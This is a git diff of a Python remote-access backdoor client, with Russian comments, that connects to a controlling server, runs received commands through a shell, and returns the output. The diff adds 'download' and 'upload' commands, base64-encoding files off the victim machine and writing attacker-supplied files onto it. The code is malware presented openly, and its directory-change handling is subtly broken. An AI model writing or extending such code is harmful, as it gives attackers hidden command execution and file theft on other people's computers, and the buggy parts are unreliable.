@@ -7,6 +7,7 @@ import os
 import shutil
 import sys
 import winreg
+import base64 
 
 #конвектирует данные пайтона в джейсон а его в свою очередь в байты
 def reliable_send(data):
@@ -33,7 +34,7 @@ def connection():
                 except:
                         connection()
 
-#получает команды, выполняет и потом отправляет результаты на сервер
+#получает файлы, команды, выполняет и потом отправляет результаты на сервер
 def shell():
         while True:
                 command = reliable_recv()
@@ -41,13 +42,25 @@ def shell():
                         break
                 elif command[:2] == "cd" and len(command) > 1:
                         try:
-                                os.chdir(command[:3])
+                                os.chdir(command[:3].strip())
                         except:
-                                continue
+                                pass
+                elif command[:8] == "download":
+                        try:
+                                with open(command[9:], "rb") as file:
+                                        reliable_send(base64.b64encode(file.read()).decode())
+                        except FileNotFoundError:
+                                reliable_send("[!!] Файл не найден") 
+                elif command[:6] == "upload":
+                        with open(command[7:], "wb") as file:
+                                data = reliable_recv()
+                                try:
+                                        file.write(base64.b64decode(data))
+                                except:
+                                        pass
                 else:
                         try:
                                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
-
                                 result = proc.stdout.read() + proc.stderr.read()
                                 reliable_send(result.decode())
                         except:
